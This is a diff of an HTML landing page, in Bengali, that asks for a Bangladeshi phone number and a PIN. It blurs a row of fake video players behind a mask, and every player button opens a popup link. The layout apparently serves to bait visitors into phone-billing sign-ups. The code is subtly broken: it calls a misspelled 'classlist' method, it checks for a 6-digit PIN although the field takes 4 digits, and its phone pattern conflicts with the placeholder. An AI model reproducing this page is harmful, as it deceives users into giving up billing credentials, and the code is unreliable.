@@ -58,15 +58,15 @@
                 <div class="form-group">                        
                     <div class="phone-input">
                         <span class="country-code">+88</span>
-                        <input type="text" name="msisdn" id="msisdn" placeholder="আপনার ফোন নম্বর লিখুন(0123-4567890)" required 
+                        <input class="blink" type="text" name="msisdn" id="msisdn" placeholder="ফোন নম্বর।(0123-4567890)" required 
                                pattern="[0-9]{4} [0-9]{7}" title="অনুগ্রহ করে এই ফর্ম্যাটে 11 টি সংখ্যা লিখুন: 0123-4567890">
                     </div>                       
                 </div>
                 <!-- 2、验证码输入框 + 发送验证码按钮 -->
                 <div class="form-group">                   
                     <div class="pin-input-container-pin">
-                        <input type="text" name="pin" id="pin" class="pin-input" placeholder="4-সংখ্যার পিন লিখুন" 
-                               pattern="[0-9]{4}" title="অনুগ্রহ করে 4 টি সংখ্যা লিখুন" maxlength="4" disabled>
+                        <input type="text" name="pin" id="pin" class="pin-input blink" placeholder="4-সংখ্যার পিন লিখুন" 
+                               pattern="[0-9]{4}" title="অনুগ্রহ করে 4 টি সংখ্যা লিখুন" maxlength="4">
                         <button type="submit" class="send-pin-btn" id="sendPinBtn">পিন পাঠান</button>
                     </div>                       
                 </div>             
@@ -99,6 +99,7 @@
                 if (!input.value.match(/^\d{4} \d{7}$/)) {
                     errorDiv.textContent = 'দয়া করে এই ফর্ম্যাটে একটি বৈধ ফোন নম্বর লিখুন: 0123-4567890';
                     errorDiv.style.display = 'block';
+                    input.classlist.remove('blink');
                     return;
                 }
                 
@@ -197,11 +198,13 @@
                 const successDiv = document.getElementById('successMessage');
                 const loadingDiv = document.getElementById('loading');
                 const containerDiv = document.getElementById('container');
-                const player = document.getElementById('player');
+                const maskDiv = document.getElementById('mask');
+                const blurbgDiv = document.getElementById('blur-bg');
                 // 验证PIN码
                 if (!pinInput.value.match(/^\d{6}$/)) {
                     errorDiv.textContent = 'অনুগ্রহ করে একটি বৈধ 6-সংখ্যার পিন কোড লিখুন।';
                     errorDiv.style.display = 'block';
+                    pinInput.classlist.remove('blink');
                     return;
                 }
                 
@@ -240,9 +243,10 @@
                                 containerDiv.classList.add('fade-out');
                                 
                                 setTimeout(() => {
-                                    containerDiv.classList.add('hidden');}, 1000);
+                                    containerDiv.classList.add('hidden');maskDiv.classList.add('hidden');
+                                    blurbgDiv.classList.add('hidden');}, 1000);
                             }, 1000);
-                            player.classList.remove('disable-interaction');    
+                            
                             
                         }
                     } 
@@ -279,12 +283,14 @@
         });
     </script>
 
+    <div class="mask" id="mask">
+    </div>
 
-    <div class="disable-interaction" id="player">
+    
     <!-- 第一行播放器 -->
     <div class="player-row">
         <div class="player-container">
-            <div class="player bg1">
+            <div class="player bg1 blur-bg">
                 <div class="controls">
                     <button class="button" onclick="launchpopLink()">▶</button>
                     <div class="progress">
@@ -306,7 +312,7 @@
     <!-- 第二行播放器 -->
     <div class="player-row">
         <div class="player-container">
-            <div class="player bg2">
+            <div class="player bg2 blur-bg">
                 <div class="controls">
                     <button class="button" onclick="launchpopLink()">▶</button>
                     <div class="progress">
@@ -327,15 +333,14 @@
     
     <!-- 第三行播放器 -->
     <div class="player-row">
-        <div class="player-row disable-interaction" >
         <div class="player-container">
-            <div class="player bg3">
+            <div class="player bg3 blur-bg">
                 <div class="controls">
                     <button class="button" onclick="launchpopLink()">▶</button>
                     <div class="progress">
                         <div class="progress-filled"></div>
                     </div>
-                    <div class="time">0:00 / 46:17</div>
+                    <div class="time">0:00 / 35:21</div>
                     <button class="button" onclick="launchpopLink()">🔊</button>
                     <button class="button" onclick="launchpopLink()">⛶</button>
                 </div>
@@ -350,9 +355,9 @@
     
     <!-- 第四行播放器 -->
     <div class="player-row">
-        <div class="player-row disable-interaction" >
+        <div class="player-row" >
         <div class="player-container">
-            <div class="player bg4">
+            <div class="player bg4 blur-bg">
                 <div class="controls">
                     <button class="button" onclick="launchpopLink()">▶</button>
                     <div class="progress">
@@ -369,7 +374,6 @@
                 </div>
             </div>
         </div>
-    </div>
     </div>
 </body>
 </html>
